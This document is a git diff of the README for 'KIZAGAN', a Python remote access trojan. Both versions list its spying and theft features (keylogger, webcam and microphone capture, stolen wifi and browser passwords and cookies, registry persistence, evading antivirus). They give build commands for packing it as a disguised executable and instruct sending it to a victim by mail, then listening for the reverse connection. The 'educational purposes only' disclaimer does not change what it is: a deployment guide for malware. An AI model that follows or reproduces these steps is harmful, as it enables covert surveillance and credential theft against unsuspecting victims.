@@ -1,126 +1,93 @@
 # KIZAGAN
 
-KIZAGAN is a remote access trojan built with python.It can take victim's camera snapshots, microphone sounds, screenshots... Also it has keylogger inside and it is undetectable.
+KIZAGAN is a RAT built with python.It can take camera snapshots, screenshots, browser datas and cookies etc. Also it has a keylogger and it is undetectable.
 
-## Features :
+## Features
 
-+ Basic file commands (rename, delete, create etc.)
++ Basic file/directory commands.(rename, delete, create etc.)
 
-+ Executing windows cmd commands directly.
++ Can execute windows command prompt commands directly.
 
-+ Can get microphone sounds.
++ Can get camera snapshots.
 
-+ Can get victim's camera snapshots.
++ Can get screenshots.
 
-+ Can get screenshot from victim's computer.
++ Can download files.
 
-+ Has chat command to chat with victim.
-
-+ Can download files from victim's computer.
-
-+ Can upload files to victim's computer.
++ Can upload files.
 
 + Has keylogger.
 
-+ Can speak words in victim's computer.
++ Have persistence.(Persistence:It can hide itself to registry.)
 
-+ Have permanance that can hide himself and adding himself in registry.
++ Can take wifi names and passwords.
 
-+ Can take wifi names and passwords from victim's computer.
-
-+ Can merge with a file that you specify.
++ Can combine with a file you specify.
 
 + Constant connections.
 
 + Undetectable.
 
-Antivirus scan result : (btw, scan it on non-distrubuted online antivirus scanners please.)
++ Can get browser saved usernames and passwords.
 
-![scan-result](https://user-images.githubusercontent.com/68844502/232308126-a7756b05-6d6f-4a4f-abac-10a87d0514f1.PNG)
++ Can get browser cookies.
 
 ## EDUCATIONAL PURPOSES ONLY.
 
 ##### I am not responsible in bad uses of kizagan.
 
+## SETUP
 
-# SETUP
+Firstly, you must need a windows computer.Because we don't want to encounter any errors while converting Python to exe.For server you can use linux or windows it doesn't matter.But we must need windows to conversion process.So execute the following command :
 
-1. In linux (Your server that listening connections from clients.)
++ python setup.py
 
-+ python setupLinux.py
+## USAGE
 
-2. In windows (Theese libraries are needed when converting python file to exe file.)
+1. If you want to put icon to your trojan, go to internet and find a icon.Then download to kizagan-main directory.(or you can convert png, jpg file to .ico file)
 
-+ python setupWindows.py
+2. If you want to combine a file with trojan, go to internet and find a file you wanted.Then download to kizagan-main directory.
 
-# USAGE
+![kizagan1](https://github.com/st4inl3s5/kizagan/assets/68844502/cc828e59-d4fa-416e-914e-94f22a39890d)
 
-1. Open the kizaganEN.py with a text editor and change the ip and port according to yourself. (You can set for port forward services ngrok etc.)
+3. Execute the builder.py to convert python file to windows executable file.
 
-![a1](https://user-images.githubusercontent.com/68844502/232308824-5bacce15-50b6-44b4-9df2-eb343b345b6b.PNG)
+![kizagan2](https://github.com/st4inl3s5/kizagan/assets/68844502/2414788d-1fd5-4a52-80c2-02bae7d26286)
 
-2. Get an icon file and a merge file from the internet etc.
++ -ip = Set the ip address for reverse connection.
 
-![a3](https://user-images.githubusercontent.com/68844502/232310059-bbc0475a-1f8e-41f5-9b2e-bd98b97d245f.jpg)
++ -p = Set the port number for reverse connection.
 
-2. Change the value of Open_Added_File function then save it.
++ -i = Set the icon for trojan if you wanted.
 
-![a4](https://user-images.githubusercontent.com/68844502/232310658-07c4b9c0-68e9-40e4-9852-a5f9d3217d64.PNG)
++ -f = Set the combine file for trojan if you wanted.
 
-3. Use the pyinstaller to convert this python file to exe file.(Make it on windows.)
-+ pyinstaller --onefile --noconsole --icon <your icon file with .ico extension> --add-data "<example.pdf>;." -w kizaganEN.py
+4. Wait for conversion process.
 
-![a5](https://user-images.githubusercontent.com/68844502/232311188-9ad74a61-307e-4741-ae10-48491904d701.PNG)
+![kizagan3](https://github.com/st4inl3s5/kizagan/assets/68844502/37f1c9e4-f54d-417a-baad-ef136831c625)
 
-4. When the execute is finished,our trojan file with .exe extension found in dist file.
+5. When its done, you can see the executable file in the 'dist' folder.And from now it's up to you.So send this file to victim(via mail etc.) and wait for opens the file.
 
-![a5](https://user-images.githubusercontent.com/68844502/232312235-7b3a0501-bdb1-4719-9f14-d293949e1b64.PNG)
+6. Let's say victim opened the trojan.When trojan opened, our combine file will open up.And our trojan is executed background.
 
-![a6](https://user-images.githubusercontent.com/68844502/232312242-81ca1282-b956-4f4e-bd0b-9d9c83664392.PNG)
+![kizagan4](https://github.com/st4inl3s5/kizagan/assets/68844502/11372467-edfa-42cb-b507-2e56cf3315da)
 
-5. Now, we are ready.Send this .exe file to a victim and wait for the executing the trojan.
+7. You can listen the incoming connections with following command :
 
-6. When the trojan executes, the trojan will send a connection to you in every 5 seconds.
++ python server.py -ip <ip_address_to_listen> -p <port_number_to_listen>
 
-7. Let's say, the victim executed the trojan.We can get this connection by following command in linux :
+![kizagan5](https://github.com/st4inl3s5/kizagan/assets/68844502/81bbfc39-61f6-4b8a-89b6-582cd0f18837)
 
-+ python kizagan_listener.py -ip ip -p port
+8. When the connection comes, you can start executing commands on target computer.
 
-![a8](https://user-images.githubusercontent.com/68844502/232312631-5850918b-f8b3-4a4d-b66e-9f2e0a809dc4.PNG)
+![kizagan6](https://github.com/st4inl3s5/kizagan/assets/68844502/5ad8a041-8f5f-44d1-a33a-bda7b859820b)
 
-8. When the trojan executed our merge file will opened and a connection will come to us.
+9. And we are rocking now! You can see the commands with 'help' command.
 
-![a9](https://user-images.githubusercontent.com/68844502/232312825-7f919b2d-1689-4a6f-a0cb-d772308bd9c3.PNG)
+![kizagan7](https://github.com/st4inl3s5/kizagan/assets/68844502/7ef506b0-26e2-46b6-a0b5-56f4b466da55)
 
-![a10](https://user-images.githubusercontent.com/68844502/232312831-307e8bd1-049a-4a75-a815-c4b7191756e7.PNG)
+![kizagan8](https://github.com/st4inl3s5/kizagan/assets/68844502/ca7bc8e9-1be1-456a-a7af-069609b32e23)
 
-9. If you want to record microphone of victim, say 'Y' for it.
-
-![a10](https://user-images.githubusercontent.com/68844502/232313290-a627eea5-84cd-4a5d-873c-6488996e2dc4.PNG)
-
-10. You can set default by saying 'N' for it.Or you can change the chat port.
-
-![a11](https://user-images.githubusercontent.com/68844502/232313292-cec56a06-42a3-4176-941c-afeaa03d944d.PNG)
-
-11. And we are rocking now! You can view the commands by using 'help' command.
-
-![a15](https://user-images.githubusercontent.com/68844502/232313369-a0d41ad8-2b03-4490-a7da-37c850b8e4d6.PNG)
-
-![a16](https://user-images.githubusercontent.com/68844502/232313370-011f79e1-b650-4b54-8425-ff498603cc05.PNG)
-
-![a12](https://user-images.githubusercontent.com/68844502/232313371-bf3ba723-d6d7-40e3-9723-82cd14dd9390.PNG)
-
-![a13](https://user-images.githubusercontent.com/68844502/232313373-2d75ce01-9b89-4b21-82cc-7686b2b4961b.PNG)
-
-![a14](https://user-images.githubusercontent.com/68844502/232313374-64955604-ed82-4382-acb8-687742936928.PNG)
-
-12. Getting microphone sounds, camera snapshots, screenshots etc.
-
-![a17](https://user-images.githubusercontent.com/68844502/232313411-cf03dc49-6a6f-4915-b788-d53bc7d135e5.PNG)
-
-![a18](https://user-images.githubusercontent.com/68844502/232313414-692772de-9983-480e-bc3a-eeb6041e9907.PNG)
-
-
-### You can contact me here or in instagram : 
+### You can contact me here or on instagram
 
 + https://www.instagram.com/arduinocum.py/
